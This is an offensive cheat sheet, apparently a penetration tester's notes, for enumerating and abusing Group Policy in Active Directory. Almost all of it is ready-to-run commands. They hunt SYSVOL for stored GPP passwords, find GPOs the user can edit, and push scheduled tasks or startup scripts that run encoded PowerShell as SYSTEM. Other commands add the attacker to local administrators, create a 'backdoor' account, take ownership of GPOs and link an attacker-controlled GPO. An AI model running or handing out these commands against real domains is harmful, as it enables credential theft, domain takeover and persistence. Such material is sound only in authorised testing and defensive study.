# Enumeration
```powershell
# Currently applied GPOs (user + computer)
gpresult /r
gpresult /h report.html /f

# List all GPOs in domain (requires GroupPolicy module / RSAT)
Get-GPO -All | Select DisplayName, Id, GpoStatus

# GPO report (XML/HTML) for a specific GPO
Get-GPOReport -Guid <GUID> -ReportType Html -Path report.html

# Inheritance for an OU
Get-GPInheritance -Target "OU=Workstations,DC=corp,DC=local"

# Resultant Set of Policy GUI
rsop.msc
```

## PowerView
```powershell
# All GPOs in the domain
Get-DomainGPO | Select displayname,name,gpcfilesyspath

# GPOs applied to a specific OU
Get-DomainOU -Properties name,gplink | Select name,gplink

# Local group/user mappings pushed by GPO (Restricted Groups / GPP)
Get-DomainGPOLocalGroup

# Map which computers a GPO's local-group settings apply to
Get-DomainGPOUserLocalGroupMapping -LocalGroup Administrators

# Find GPOs that grant a given user/group local admin somewhere
Get-DomainGPOUserLocalGroupMapping -Identity <user> -LocalGroup Administrators

# Reverse: given a computer, which GPOs/groups control its local admins
Find-GPOComputerAdmin -ComputerName dc01.corp.local

# Reverse: given a user, where do their GPO-derived rights land them
Find-GPOLocation -UserName jdoe

# Raw ACL on a GPO object
Get-DomainObjectAcl -SearchBase "CN=Policies,CN=System,DC=corp,DC=local" -ResolveGUIDs |
  Where-Object {$_.ActiveDirectoryRights -match "WriteProperty|GenericAll|GenericWrite|WriteDacl|WriteOwner"}
```

## BloodHound
```powershell
// Principals with edit rights on any GPO
MATCH (n)-[r:GenericAll|GenericWrite|WriteDacl|WriteOwner|WriteProperty]->(g:GPO)
RETURN n.name, type(r), g.name

// GPOs linked to high-value OUs
MATCH p=(g:GPO)-[:GPLink]->(o:OU)
WHERE o.highvalue = true
RETURN p

// Full attack path: who can abuse a GPO to reach Domain Admins
MATCH p = shortestPath((u:User)-[*1..]->(d:Group {name:"DOMAIN ADMINS@CORP.LOCAL"}))
WHERE NOT u.name = "DOMAIN ADMINS@CORP.LOCAL"
RETURN p
```

## Group3r
```powershell
group3r.exe -f output.log
```

## LDAP
```powershell
# Enumerate GPO container objects
ldapsearch -x -H ldap://dc01.corp.local -D "user@corp.local" -w 'Pass123!' \
  -b "CN=Policies,CN=System,DC=corp,DC=local" "(objectClass=groupPolicyContainer)" \
  displayName gPCFileSysPath

# Browse SYSVOL share (often readable by Authenticated Users)
smbclient //dc01.corp.local/SYSVOL -U corp.local/user
```

# Finding Abusable GPO Permissions
```powershell
# PowerView one-liner: GPOs your current user (or its groups) can modify
$me = ([Security.Principal.WindowsIdentity]::GetCurrent()).User.Value
Get-DomainGPO | ForEach-Object {
    Get-DomainObjectAcl -Identity $_.name -ResolveGUIDs |
    Where-Object { $_.SecurityIdentifier -eq $me -and
                    $_.ActiveDirectoryRights -match "GenericAll|WriteDacl|WriteOwner|GenericWrite" }
}


Get-DomainObjectAcl -SearchBase "OU=Workstations,DC=corp,DC=local" -ResolveGUIDs |
  Where-Object {$_.ActiveDirectoryRights -match "WriteProperty" -and $_.ObjectAceType -match "GP-Link"}
```

# GPP / SYSVOL Credential Hunting (MS14-025)
```powershell
# PowerSploit
Get-GPPPassword
Get-GPPAutologon

# Manual hunt
findstr /S /I cpassword \\dc01.corp.local\SYSVOL\corp.local\Policies\*.xml

# Linux equivalents
crackmapexec smb dc01.corp.local -u user -p pass -M gpp_password
gpp-decrypt <cpassword_blob>
```

# SharpGPOAbuse (most common, .NET)
```powershell
# Add an immediate scheduled task to a GPO (runs as SYSTEM on next refresh) - computer-targeted
SharpGPOAbuse.exe --AddComputerTask --TaskName "Updater" --Author corp\jdoe `
  --Command "cmd.exe" --Arguments "/c net localgroup administrators corp\jdoe /add" `
  --GPOName "Default Domain Policy"

# User-targeted immediate task (runs in user context)
SharpGPOAbuse.exe --AddUserTask --TaskName "Sync" --Author corp\jdoe `
  --Command "powershell.exe" --Arguments "-enc <base64payload>" `
  --GPOName "Workstation Policy"

# Add a computer startup script
SharpGPOAbuse.exe --AddComputerScript --ScriptName "logon.bat" --ScriptContent "net user backdoor P@ss123 /add" `
  --GPOName "Workstation Policy"

# Add local admin via Restricted Groups
SharpGPOAbuse.exe --AddLocalAdmin --UserAccount corp\jdoe --GPOName "Workstation Policy"
```

# PowerView
```powershell
New-GPOImmediateTask -TaskName "Debug" -GPODisplayName "Workstation Policy" `
  -CommandLine "powershell.exe" -CommandArguments "-enc <base64payload>" -Force

# Take ownership of the GPO object
Set-DomainObjectOwner -Identity "Workstation Policy" -OwnerIdentity jdoe

# Then grant yourself GenericAll
Add-DomainObjectAcl -TargetIdentity "Workstation Policy" -PrincipalIdentity jdoe -Rights All

$gpLink = (Get-DomainOU -Identity "Workstations").gplink
Set-DomainObject -Identity "OU=Workstations,DC=corp,DC=local" `
  -Set @{gplink="[LDAP://CN={ATTACKER-GPO-GUID},CN=Policies,CN=System,DC=corp,DC=local;0]$gpLink"}
```

# PYGPOABUSE
```powershell
python3 pygpoabuse.py corp.local/jdoe:'Pass123!' -gpo-id <GUID> -command "net localgroup administrators corp\\jdoe /add" -dc-ip 10.10.10.10
```

# Forcing Policy Application
```powershell
# On the target (if you already have a session/exec there)
gpupdate /force

# Remotely (requires admin on target, or via PowerView)
Invoke-GPUpdate -ComputerName victim01.corp.local -Force
```
